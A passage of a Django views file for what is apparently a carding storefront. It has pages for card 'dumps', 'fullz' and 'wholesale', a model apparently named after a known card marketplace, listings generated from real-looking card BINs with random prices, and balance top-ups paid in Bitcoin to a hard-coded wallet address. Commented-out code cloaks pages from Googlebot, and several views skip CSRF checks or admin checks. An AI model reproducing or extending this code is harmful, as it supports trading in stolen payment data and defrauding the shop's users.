                        context['error'] = 'Invalid card number'  # type: ignore
                    return render(request, 'main/dumps_res.html', context)
                # else:
                #     # Generate items based on the search query
                #     context['items'] = [f"{query}" for i in range(1, 11)]
                #     return render(request, 'main/css_reasult.html', context)
        else:
            listofBins = ['479126', '410894', '427138', '480011',
                        '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
            query = random.choice(listofBins)
            if len(query) != 6:
                return render(request, 'main/dumps.html', context)
            else:

                listofBins = []
                query = query[:6]
                bin_info = get_bin_info(query)
                price = random.randint(18, 36)
                if query:
                    if bin_info:
                        context['issuer'] = bin_info['issuer']  # type: ignore
                        context['country'] = bin_info['country']  # type: ignore
                        context['bank_code'] = bin_info['bank_code']  # type: ignore
                        context['query'] = query
                        context['formatted_dates'] = generate_random_dates()  # type: ignore
                        context['scheme'] = bin_info['scheme']  # type: ignore
                        context['type'] = bin_info['type']  # type: ignore
                        context['price'] = price  # type: ignore
                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]  # type: ignore
                        print(context['items'])

                    else:
                        context['error'] = 'Invalid card number'  # type: ignore
                    return render(request, 'main/dumps_res.html', context)


@login_required_custom(login_url='/login')
def fullz(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/fullz.html', context)


@login_required_custom(login_url='/login')
def wholesale(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/wholesale.html' , context)


@login_required_custom(login_url='/login')
def cart(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    if request.user.is_authenticated:
        cart_items = CartItem.objects.filter(user=request.user)
        try:
            balance = Balance.objects.get(user=request.user).balance
            if balance < 100:
                context['balance'] = balance  # type: ignore
                print(balance)

                print("Low balance")
            context['balance'] = balance
        except Balance.DoesNotExist:
            print("No balance object for this user")
            context['low_balance'] = True
        context['cart_items'] = cart_items
        return render(request, 'main/cart.html', context)
    else:
        return redirect('login')


from django.http import JsonResponse


# views.py
def add_to_cart(request):
    if request.method == 'POST' and request.user.is_authenticated:
        # Get the item details from the session
        item = request.POST.get('item')
        price = request.POST.get('price')
        query = request.POST.get('query')
        country = request.POST.get('country')
        issuer = request.POST.get('issuer')
        cart_item = CartItem(user=request.user, item=item, price=price, query=query, country=country, issuer=issuer)
        cart_item.save()

        # Update the cart item count in the session
        request.session['cart_item_count'] = request.session.get('cart_item_count', 0) + 1

        return JsonResponse({'success': True})
    else:
        return JsonResponse({'success': False})


@login_required_custom(login_url='/login')
def orders(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()

    # Fetch the OrdersNumber objects for the current user
    user_orders_numbers = OrdersNumber.objects.filter(orders__user=request.user).distinct()

    context = {'site_config': site_config, 'orders_numbers': user_orders_numbers}
    return render(request, 'main/orders.html', context)


@login_required_custom(login_url='/login')
def auction(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/auction.html', context)


@login_required_custom(login_url='/login')
def tools(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/tools.html', context)


# @login_required_custom(login_url='/login')
# def tickets(request):
#     return render(request, 'main/tickets.html')
@login_required_custom(login_url='/login')

# @ratelimit(key='custom', rate='10/m')

    # Rest of your view logic
def profile(request):
        # client_ip = request.META.get('REMOTE_ADDR')
        # unique_identifier = 'some_unique_identifier'  # Replace with your own unique identifier
        # rate_limit_key = f'{client_ip}-{unique_identifier}'
        # if getattr(request, 'limited', False):
        #     return HttpResponse('Too many requests', status=429)

        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/profile.html', context)


from django.contrib.auth.forms import PasswordChangeForm
from django.contrib import messages


@login_required_custom(login_url='/login')
def change_password(request):
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            messages.success(request, 'Your password was successfully updated!')
            return redirect('profile')
        else:
            messages.error(request, 'Please correct the errors below.')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'main/profile.html', {'form': form})


# def handler404(request, exception):
#     return render(request, '404.html', status=404)
from django.shortcuts import render
import logging


# custom 404 view
def custom_404(request, exception):
    return render(request, '404.html', status=404)


def error_404(request, exception):
    domain = request.get_host()

    site_config = SiteConfiguration.objects.get(domain=domain)
    data = {"name": site_config}
    return render(request, '404.html', data)


from .models import Ticket
from .forms import TicketForm


@csrf_exempt
def ticket(request):
    domain = request.get_host()
    try:
            site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    if request.method == 'POST':
        form = TicketForm(request.POST)
        if form.is_valid():
            ticket = form.save(commit=False)
            ticket.user = request.user
            ticket.save()
            return redirect('ticket')
    else:
        form = TicketForm()
    tickets = Ticket.objects.filter(user=request.user)
    return render(request, 'main/tickets.html', {'form': form, 'tickets': tickets, 'context':context})


from django.shortcuts import render, get_object_or_404
from .models import Ticket, Reply, AdminReply
from .forms import AdminReplyForm, UserReplyForm


@csrf_exempt
def ticket_list(request):
    domain = request.get_host()
    try:
            site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    tickets = Ticket.objects.all()
    return render(request, 'main/tickets_admin.html', {'tickets': tickets, 'context':context})


@csrf_exempt
def ticket_detail(request, pk):
    ticket = get_object_or_404(Ticket, pk=pk)
    adminreplays = AdminReply.objects.filter(ticket=ticket)
    # form = UserReplyForm(request.POST)

    if request.method == 'POST':
        print(request.POST)
        if request.user.is_staff:
            form = AdminReplyForm(request.POST)
        elif request.user == ticket.user:
            form = UserReplyForm(request.POST)
        print(form)  # <-- add this line to print the form object
        if form.is_valid():
            message = form.cleaned_data['admin_reply'] if request.user.is_staff else form.cleaned_data['user_reply']
            reply = Reply.objects.create(ticket=ticket, user=request.user, message=message)

    else:
        if request.user.is_staff:
            form = AdminReplyForm()
        elif request.user == ticket.user:
            form = UserReplyForm()
    replies = Reply.objects.filter(ticket=ticket).order_by('-created_at')
    return render(request, 'main/ticket_detail.html', {'ticket': ticket, 'form': form, 'replies': replies, 'adminreplays': adminreplays})


from django.http import HttpResponse

import json
from django.http import JsonResponse
from django.core.exceptions import ObjectDoesNotExist


def remove_selected_from_cart(request):
    if request.method == 'POST' and request.user.is_authenticated:
        item_ids = json.loads(request.POST.get('item_ids'))
        removed_items_count = 0

        for item_id in item_ids:
            try:
                cart_item = CartItem.objects.get(id=item_id, user=request.user)
                cart_item.delete()
                removed_items_count += 1
            except ObjectDoesNotExist:
                pass

        # Update the cart item count in the session
        request.session['cart_item_count'] = request.session.get('cart_item_count', 0) - removed_items_count

        return JsonResponse({'success': True})
    else:
        return JsonResponse({'success': False, 'error': 'Invalid request'})


def convert_to_usd(amount):
    # Make a request to the CoinGecko API to get the Bitcoin to USD exchange rate
    api_url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
    response = requests.get(api_url)

    if response.status_code == 200:
        exchange_rate = response.json()['bitcoin']['usd']
        usd_amount = amount * exchange_rate
        return usd_amount

    return 0


import requests
from .models import Balance, Transaction


def wallet_transactions(request):
    if request.method == 'POST':
        transaction_id = request.POST.get('transaction_id')

        # Check if the transaction has already been processed
        if Transaction.objects.filter(transaction_id=transaction_id).exists():
            return render(request, 'main/error.html', {'message': 'Transaction already processed'})

        # Make a request to the Blockstream API to get transaction information
        api_url = f'https://blockstream.info/api/tx/{transaction_id}'
        response = requests.get(api_url)

        if response.status_code == 200:
            transaction = response.json()

            for i in transaction['vout']:
                if i['scriptpubkey_address'] == '3HzzLcyb6H7X8VaBmCrrobnEUXzEohLdQ9':
                    amount = i['value']

                    # Convert Bitcoin value to USD
                    usd_amount = convert_to_usd(amount) * 0.00000001
                    usd_amount = round(usd_amount, 2)

                    # Update the user's balance
                    user = request.user
                    balance, created = Balance.objects.get_or_create(user=user)
                    balance.balance += usd_amount
                    balance.save()

                    # Save the transaction ID
                    Transaction.objects.create(balance=balance, transaction_id=transaction_id)

                    return render(request, 'main/success.html', {'amount': usd_amount})

            return render(request, 'main/error.html', {'message': 'Transaction not found'})

    return render(request, 'main/wallet.html')


# @ratelimit(key='ip', rate='10/m')  # 10 requests per minute
@login_required_custom(login_url='/login')
def address_list(request):
    # if getattr(request, 'limited', False):
    #     return HttpResponse('Too many requests', status=429)
    content = [
        "Welcome to our website!",
        "Join our community today!",
        "Discover new products and services!",
        "Get the latest news and updates!",
        "Connect with like-minded people!",
        "Find inspiration and motivation!",
    ]
    random_content = random.choice(content)
    domain = request.get_host()

    context = {
        'random_content': random_content,
        'domain':domain
    }
    print(domain)
    # user_agent = request.META.get('HTTP_USER_AGENT', '')
    # if 'curl' in user_agent.lower() or 'postman' in user_agent.lower():
    #     # Request is coming from an API client
    #     return render(request, 'googlebot_template.html', context)
    # elif 'googlebot' in user_agent.lower() or 'google' in user_agent.lower() or ('google' in user_agent.lower() and 'adwords' in user_agent.lower()) or 'http://www.google.com/bot.html' in user_agent.lower():
    #     # Request is coming from a Googlebot crawler or google.com
    #     return render(request, 'googlebot_template.html', context)
    # else:
    billing_data = Billing.objects.filter(user=request.user)
    # context['billing_data'] = billing_data

    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config, 'billing_data': billing_data}
    address = BriansclubAddress.objects.first()
    if request.method == 'POST':
        transaction_id = request.POST.get('transaction_id')

        # Check if the transaction has already been processed
        if Transaction.objects.filter(transaction_id=transaction_id).exists():
            return render(request, 'main/error.html', {'message': 'Transaction already processed or the Transaction ID is invalid'})

        # Make a request to the Blockstream API to get transaction information
        api_url = f'https://blockstream.info/api/tx/{transaction_id}'
        response = requests.get(api_url)

        if response.status_code == 200:
            transaction = response.json()

            for i in transaction['vout']:
                if i['scriptpubkey_address'] == '3HzzLcyb6H7X8VaBmCrrobnEUXzEohLdQ9':
                    amount = i['value']

                    # Convert Bitcoin value to USD
                    usd_amount = convert_to_usd(amount) * 0.00000001
                    usd_amount = usd_amount * 0.82
                    usd_amount = round(usd_amount, 2)

                    # Update the user's balance
                    user = request.user
                    balance, created = Balance.objects.get_or_create(user=user)
                    balance.balance += round(usd_amount, 2)
                    balance.save()

                    # Save the transaction ID
                    Transaction.objects.create(balance=balance, transaction_id=transaction_id)

                    return render(request, 'main/success.html', {'amount': usd_amount})

            return render(request, 'main/error.html', {'message': 'Transaction not found'})
    return render(request, 'main/task_list.html', {'address': address, 'context':context, 'domain':domain})


from django.shortcuts import render
from django.contrib.auth.decorators import login_required, user_passes_test
from .models import Ticket, AdminReply, Reply, Balance, Transaction
from .forms import AdminReplyForm, BalanceForm  # You'll need to create these forms


def is_admin(user):
    return user.is_superuser


@login_required_custom(login_url='/login')
@user_passes_test(is_admin)
@csrf_exempt
def ticket_view(request):
    if request.method == 'POST':
        form = AdminReplyForm(request.POST)
        if form.is_valid():
            ticket_id = request.POST.get('ticket_id')
            ticket = Ticket.objects.get(id=ticket_id)
            AdminReply.objects.create(ticket=ticket, message=form.cleaned_data['admin_reply'])
            return redirect('ticket_view')
    else:
        form = AdminReplyForm()
    tickets = Ticket.objects.all().order_by('-created_at', '-updated_at')
    return render(request, 'main/admin_tickets.html', {'tickets': tickets, 'form': form})


@login_required_custom(login_url='/login')
@user_passes_test(is_admin)
@csrf_exempt
def balance_view(request):
    if request.method == 'POST':
        form = BalanceForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('balance_view')
    else:
        form = BalanceForm()
    balances = Balance.objects.all()
    return render(request, 'main/admin_balances.html', {'balances': balances, 'form': form})
